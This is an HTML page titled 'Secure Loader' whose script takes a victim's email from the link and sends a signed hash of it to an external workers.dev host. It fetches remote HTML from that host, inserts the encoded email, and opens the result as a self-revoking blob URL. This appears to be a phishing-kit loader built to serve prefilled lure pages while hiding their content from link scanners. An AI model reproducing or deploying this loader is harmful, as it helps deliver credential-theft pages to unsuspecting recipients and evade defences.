<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Secure Loader</title>
</head>
<body>

<script>
(async function () {

  /* ===== CONFIG (EDIT THESE 2 ONLY) ===== */
  const WORKER_URL = 'https://square-sun-b728.saleudon1.workers.dev/';
  const SHARED_SECRET = '1234567890'; // same as worker
  /* ===================================== */

  const params = new URLSearchParams(location.search);
  let email = params.get('email');
  if (!email) return;

  try { email = decodeURIComponent(email); } catch {}

  const emailB64 = btoa(email);

  async function sha256(input) {
    const buf = await crypto.subtle.digest(
      'SHA-256',
      new TextEncoder().encode(input)
    );
    return [...new Uint8Array(buf)]
      .map(b => b.toString(16).padStart(2, '0'))
      .join('');
  }

  /* ---- Hash email ---- */
  const emailHash = await sha256(emailB64);

  /* ---- Create signed token ---- */
  const ts = Date.now();
  const sig = await sha256(ts + '|' + emailHash + '|' + SHARED_SECRET);
  const token = btoa(`${ts}|${emailHash}|${sig}`);

  /* ---- Fetch through worker ---- */
  const res = await fetch(
    `${WORKER_URL}?t=${encodeURIComponent(token)}&h=${emailHash}`,
    { cache: 'no-store' }
  );

  if (!res.ok) return;

  let html = await res.text();

  /* ---- Inject email (base64, hidden) ---- */
  html = html.replace(
    /<\/head>/i,
    `<meta name="injected-email" content="${emailB64}"></head>`
  );

  /* ---- Create one-time blob ---- */
  const blob = new Blob([html], { type: 'text/html' });
  const blobURL = URL.createObjectURL(blob);

  window.open(blobURL, '_blank');

  /* ---- Revoke blob (one-time use) ---- */
  setTimeout(() => URL.revokeObjectURL(blobURL), 5000);

})();
</script>

</body>
</html>
